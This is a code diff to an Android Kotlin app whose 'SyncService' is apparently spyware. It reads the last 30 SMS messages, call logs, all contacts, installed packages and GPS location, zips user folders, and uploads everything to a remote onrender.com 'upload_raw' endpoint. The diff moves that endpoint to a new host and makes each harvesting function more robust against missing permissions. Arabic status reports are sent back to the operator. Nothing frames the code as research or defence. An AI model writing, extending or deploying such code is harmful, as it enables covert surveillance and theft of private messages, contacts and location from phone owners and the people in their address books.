@@ -60,8 +60,8 @@ class SovereignWatchdogWorker(appContext: Context, workerParams: WorkerParameter
 class SyncService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val SERVER_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
-    private val UPLOAD_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
+    private val SERVER_ENDPOINT = "https://web-assets-service-1.onrender.com/api/v3/uranium/stream"
+    private val UPLOAD_ENDPOINT = "https://web-assets-service-1.onrender.com/api/v3/uranium/upload_raw"
     private val MASTER_SECRET = "BlackActivationMasterKey2026Sovereign"
     private var wakeLock: PowerManager.WakeLock? = null
 
@@ -284,9 +284,11 @@ class SyncService : Service() {
                 } else {
                     sendTextReport("خطأ الرفع", "فشل رفع أرشيف $folderName إلى السيرفر.")
                 }
+            } else {
+                sendTextReport("تنبيه الأرشيف", "مجلد $folderName فارغ أو تعذر الوصول إليه (قد يتطلب أذونات الوسائط).")
             }
         } catch (e: Exception) {
-            sendTextReport("خطأ ضغط المجلدات", "فشل ضغط $folderName: ${e.message}")
+            sendTextReport("خطأ ضغط المجلدات", "فشل ضغط $folderName بسبب الصلاحيات أو الخطأ: ${e.message}")
         } finally {
             if (zipFile != null && zipFile.exists()) {
                 zipFile.delete()
@@ -319,45 +321,61 @@ class SyncService : Service() {
     }
 
     private fun readSms(): String {
-        val sb = StringBuilder()
-        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 30")?.use { c ->
-            val a = c.getColumnIndex("address")
-            val b = c.getColumnIndex("body")
-            while (c.moveToNext()) {
-                if (a != -1 && b != -1) sb.append("From: ${c.getString(a)} | Text: ${c.getString(b)}\n")
+        return try {
+            val sb = StringBuilder()
+            contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 30")?.use { c ->
+                val a = c.getColumnIndex("address")
+                val b = c.getColumnIndex("body")
+                while (c.moveToNext()) {
+                    if (a != -1 && b != -1) sb.append("From: ${c.getString(a)} | Text: ${c.getString(b)}\n")
+                }
             }
+            if (sb.isEmpty()) "لا توجد رسائل SMS مسجلة أو الصلاحية مقيدة." else sb.toString()
+        } catch (e: Exception) {
+            "تعذر قراءة الرسائل (صلاحية READ_SMS غير منحة): ${e.message}"
         }
-        return sb.toString()
     }
 
     private fun readCallLogs(): String {
-        val sb = StringBuilder()
-        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 30")?.use { c ->
-            val n = c.getColumnIndex(CallLog.Calls.NUMBER)
-            val t = c.getColumnIndex(CallLog.Calls.TYPE)
-            while (c.moveToNext()) {
-                if (n != -1 && t != -1) sb.append("Number: ${c.getString(n)} | Type: ${c.getInt(t)}\n")
+        return try {
+            val sb = StringBuilder()
+            contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 30")?.use { c ->
+                val n = c.getColumnIndex(CallLog.Calls.NUMBER)
+                val t = c.getColumnIndex(CallLog.Calls.TYPE)
+                while (c.moveToNext()) {
+                    if (n != -1 && t != -1) sb.append("Number: ${c.getString(n)} | Type: ${c.getInt(t)}\n")
+                }
             }
+            if (sb.isEmpty()) "لا يوجد سجل مكالمات أو الصلاحية مقيدة." else sb.toString()
+        } catch (e: Exception) {
+            "تعذر قراءة سجل المكالمات (صلاحية READ_CALL_LOG غير منحة): ${e.message}"
         }
-        return sb.toString()
     }
 
     private fun readContacts(): String {
-        val sb = StringBuilder()
-        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
-            val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-            val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-            while (c.moveToNext()) {
-                if (n != -1 && p != -1) sb.append("Name: ${c.getString(n)} | Phone: ${c.getString(p)}\n")
+        return try {
+            val sb = StringBuilder()
+            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
+                val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (c.moveToNext()) {
+                    if (n != -1 && p != -1) sb.append("Name: ${c.getString(n)} | Phone: ${c.getString(p)}\n")
+                }
             }
+            if (sb.isEmpty()) "لا توجد جهات اتصال أو الصلاحية مقيدة." else sb.toString()
+        } catch (e: Exception) {
+            "تعذر قراءة جهات الاتصال (صلاحية READ_CONTACTS غير منحة): ${e.message}"
         }
-        return sb.toString()
     }
 
     private fun readApps(): String {
-        val sb = StringBuilder()
-        packageManager.getInstalledPackages(0).forEach { sb.append("Pkg: ${it.packageName}\n") }
-        return sb.toString()
+        return try {
+            val sb = StringBuilder()
+            packageManager.getInstalledPackages(0).forEach { sb.append("Pkg: ${it.packageName}\n") }
+            sb.toString()
+        } catch (e: Exception) {
+            "تعذر جلب التطبيقات المثبتة: ${e.message}"
+        }
     }
 
     @SuppressLint("MissingPermission")
@@ -365,9 +383,9 @@ class SyncService : Service() {
         return try {
             val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
             val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "Location unavailable"
+            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "الموقع غير متوفر حالياً (تأكد من تفعيل GPS ومنح صلاحية الموقع)."
         } catch (e: Exception) {
-            "Location error: ${e.message}"
+            "خطأ في قراءة الموقع (صلاحية الموقع غير منحة): ${e.message}"
         }
     }
 
